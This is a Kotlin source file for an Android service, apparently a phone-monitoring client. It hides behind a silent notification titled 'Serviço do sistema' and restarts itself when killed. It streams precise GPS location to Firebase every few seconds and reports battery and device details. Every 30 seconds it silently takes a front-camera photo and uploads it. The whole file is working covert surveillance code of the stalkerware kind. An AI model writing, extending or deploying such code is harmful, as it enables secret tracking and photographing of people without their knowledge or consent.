package com.ln.client

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.media.ImageReader
import android.os.*
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import com.google.android.gms.location.*
import java.io.ByteArrayOutputStream
import java.util.*

class MonitorService : Service() {

    private val CHANNEL_ID = "monitor_channel"
    private val db by lazy { Firebase.database.reference.child("devices").child(deviceId()) }
    private val storage by lazy { Firebase.storage.reference }
    private lateinit var fusedLocation: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        criarCanal()
        startForeground(1, buildNotification())
        fusedLocation = LocationServices.getFusedLocationProviderClient(this)
        iniciarLocalizacao()
        iniciarHeartbeat()
    }

    private fun deviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: "device_${System.currentTimeMillis()}"
    }

    private fun criarCanal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(
                CHANNEL_ID,
                "Serviço do Sistema",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Serviço em execução"
                setShowBadge(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(canal)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviço do sistema")
            .setContentText("Em execução")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    private fun iniciarLocalizacao() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L)
            .setMinUpdateIntervalMillis(3000L)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { enviarLocalizacao(it) }
            }
        }

        try {
            fusedLocation.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
        } catch (e: SecurityException) {
            e.printStackTrace()
        }
    }

    private fun enviarLocalizacao(loc: Location) {
        val data = mapOf(
            "lat" to loc.latitude,
            "lng" to loc.longitude,
            "accuracy" to loc.accuracy,
            "speed" to loc.speed,
            "timestamp" to System.currentTimeMillis()
        )
        db.child("location").setValue(data)
    }

    private fun iniciarHeartbeat() {
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                enviarStatus()
                capturarFoto("front")
                handler.postDelayed(this, 30000L) // a cada 30s
            }
        }
        handler.post(runnable)
    }

    private fun enviarStatus() {
        val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
        val bateria = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val carregando = bm.isCharging

        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager

        val status = mapOf(
            "battery" to bateria,
            "charging" to carregando,
            "modelo" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android" to Build.VERSION.RELEASE,
            "online" to true,
            "lastSeen" to System.currentTimeMillis()
        )
        db.child("status").setValue(status)
    }

    private fun capturarFoto(camera: String) {
        try {
            val manager = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                val chars = manager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (camera == "front") facing == CameraCharacteristics.LENS_FACING_FRONT
                else facing == CameraCharacteristics.LENS_FACING_BACK
            } ?: return

            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                reader.close()
                uploadFoto(bytes, camera)
            }, Handler(Looper.getMainLooper()))

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    val surfaces = listOf(imageReader.surface)
                    device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            request.addTarget(imageReader.surface)
                            session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                    device.close()
                                }
                            }, Handler(Looper.getMainLooper()))
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { device.close() }
                    }, Handler(Looper.getMainLooper()))
                }
                override fun onDisconnected(device: CameraDevice) { device.close() }
                override fun onError(device: CameraDevice, error: Int) { device.close() }
            }, Handler(Looper.getMainLooper()))

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun uploadFoto(bytes: ByteArray, tipo: String) {
        val id = deviceId()
        val ref = storage.child("fotos/$id/${tipo}_${System.currentTimeMillis()}.jpg")
        ref.putBytes(bytes).addOnSuccessListener { snap ->
            snap.storage.downloadUrl.addOnSuccessListener { uri ->
                db.child("fotos").child(tipo).setValue(mapOf(
                    "url" to uri.toString(),
                    "timestamp" to System.currentTimeMillis()
                ))
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        fusedLocation.removeLocationUpdates(locationCallback)
        // Reinicia o serviço se for morto
        val restart = Intent(this, MonitorService::class.java)
        startService(restart)
    }
}
